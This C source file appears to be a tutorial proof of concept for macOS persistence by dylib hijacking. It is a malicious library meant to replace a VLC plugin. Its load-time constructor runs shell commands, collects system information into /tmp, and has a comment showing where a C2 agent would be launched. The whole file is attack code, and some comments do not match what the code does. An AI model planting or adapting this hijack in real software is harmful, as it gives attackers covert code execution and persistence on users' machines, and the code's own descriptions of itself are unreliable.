/*
 * macOS hacking
 * persistence 3: dylib hijacking
 * evil library: hack2
 * victim library: libstats_plugin.dylib (VLC plugin)
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>

/* 
 * this constructor runs the moment VLC loads the dylib.
 * we run the payload in the background (&) so VLC doesn't hang.
 */
__attribute__((constructor))
void load_malware() {
  // for the demo: Create a file and send a notification
  system("touch /tmp/meow.txt");
  
  // write to /tmp to bypass Folder Permissions (TCC)
  char *filePath = "/tmp/meow.txt";
    
  // simple log to verify execution
  char command[1024];
  snprintf(command, sizeof(command), "/usr/sbin/system_profiler SPSoftwareDataType > %s 2>&1", filePath);
  system(command);

  FILE *f = fopen(filePath, "a");
  if (f) {
    fprintf(f, "\nexecuted as UID: %d\n", getuid());
    fclose(f);
  }
  /* 
   * in a real scenario, we would execute our C2 agent like this:
   * system("/Users/Shared/hack &"); 
   */
}

__attribute__((destructor))
void cleanup() {
  // path to original
  void* handle = dlopen("/Applications/VLC.app/Contents/MacOS/plugins/libstats_plugin.dylib.bak", RTLD_NOW);
  if (!handle) {
    printf("Failed to load original plugin\n");
  }
}